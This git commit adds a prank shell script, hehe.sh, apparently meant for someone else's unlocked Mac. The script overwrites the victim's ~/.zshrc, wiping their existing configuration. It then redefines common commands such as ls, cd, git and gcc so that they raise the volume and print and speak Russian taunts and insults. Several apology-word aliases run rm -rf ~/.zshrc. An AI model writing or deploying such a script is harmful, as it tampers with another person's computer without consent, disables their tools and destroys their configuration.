10197b0d551129d481c5eea2b379285b9d998c8f
klotzgal <118464147+klotzgal@users.noreply.github.com>
2023-01-24 20:31:11 +0300

    Add files via upload

---
+++ hehe.sh
@@ -0,0 +1,37 @@
+#bin/bash/
+file=~/.zshrc
+# papka="mkdir Проси\ прощения"
+touch $file
+
+echo "echo ಥ_ಥ Почему ты не заблокировал меня ಥ_ಥ" > $file
+echo " ">> $file
+# echo "i=0">> $file
+
+echo $papka>> $file
+str="osascript -e \"set Volume 4\""
+
+# echo $str >> .zshrc
+
+echo "alias ls='echo Почему ты не заблокировал мак && $str && say -v Milena Почему ты не заблокировал мак'">> $file
+echo "alias cd='echo Жаль, но я не могу этого сделать && $str  && say -v Milena Жаль, но я не могу этого сделать' ">> $file
+echo "alias pwd='echo Нужно всегда блокировать компьютер, когда уходишь && $str  && say -v Milena Нужно всегда блокировать компьютер, когда уходишь'">> $file
+echo "alias whoami='echo Свинья не мытая && $str  && say -v Milena Свинья не мытая'">> $file
+echo "alias git='echo Какой гит, ты даже компьютер заблокировать не можешь && $str  && say -v Milena Какой гит, ты даже компьютер заблокировать не можешь'">> $file
+echo "alias gcc='echo Стой стой стой, никакого кода && $str && say -v Milena Стой стой стой, никакого кода'">> $file
+
+
+
+
+
+
+
+
+echo " ">> $file
+# 
+echo "alias Прости='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias прости='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias sorry='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias Sorry='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias klotzgal='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias извини='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias Извини='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
